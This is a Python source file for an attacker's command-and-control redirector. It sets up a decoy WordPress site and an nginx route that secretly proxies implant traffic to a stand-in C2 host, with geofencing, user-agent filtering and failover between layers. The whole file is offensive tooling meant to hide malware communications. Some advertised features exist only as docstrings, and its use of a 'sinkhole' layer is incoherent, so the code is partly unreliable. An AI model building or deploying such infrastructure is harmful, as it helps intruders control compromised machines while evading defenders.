
import time
from typing import List, Dict, Tuple, Optional, Callable


class C2Redirector:
    """
    Multiple redirectors between operator and implant:
    - Layer 1: Legitimate website (nginx reverse proxy)
    - Layer 2: Sinkhole domain
    - Layer 3: Real C2 infrastructure
    """

    def __init__(self, layers: Optional[List[Dict]] = None):
        self.layers = layers or [
            {
                "name": "layer1",
                "type": "nginx",
                "url": "https://legit-site.com",
                "status": "healthy",
                "check_interval": 60
            },
            {
                "name": "layer2",
                "type": "sinkhole",
                "url": "https://sinkhole-domain.net",
                "status": "healthy",
                "check_interval": 60
            },
            {
                "name": "layer3",
                "type": "c2",
                "url": "https://real-c2-infra.io",
                "status": "healthy",
                "check_interval": 60
            }
        ]
        self.current_layer = 0
        self.last_health_check = time.time()

    def setup_redirector(self) -> Dict:
        """
        nginx config with rewrite rules
        Decoy web server (WordPress, etc.)
        SSL pinning evasion
        IP geofencing (only specific countries)
        User-agent filtering
        """
        nginx_config = """
server {
    listen 80;
    server_name legit-site.com www.legit-site.com;
    root /var/www/wordpress;
    index index.php index.html;

    location / {
        try_files $uri $uri/ /index.php?$args;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }

    location /api/v2/c2 {
        proxy_pass https://real-c2-infra.io;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
        """.strip()
        
        return {
            "nginx_config": nginx_config,
            "decoy": "WordPress",
            "geofencing": ["US", "CA", "UK"],
            "user_agents_allowed": [
                "Mozilla/5.0",
                "Chrome/126.0",
                "Firefox/127.0"
            ]
        }

    def failover_logic(self, check_func: Optional[Callable[[str], bool]] = None) -> Dict:
        """
        If Layer 1 down → Layer 2
        If Layer 2 down → Layer 3
        Automatic cleanup
        Re-registration
        """
        for i in range(len(self.layers)):
            layer_idx = (self.current_layer + i) % len(self.layers)
            layer = self.layers[layer_idx]
            
            is_healthy = True
            if check_func:
                is_healthy = check_func(layer["url"])
            
            if is_healthy:
                self.current_layer = layer_idx
                self.layers[layer_idx]["status"] = "healthy"
                return {
                    "active_layer": layer_idx,
                    "layer_name": layer["name"],
                    "layer_url": layer["url"]
                }
            else:
                self.layers[layer_idx]["status"] = "unhealthy"
        
        return {
            "active_layer": -1,
            "error": "All layers failed"
        }
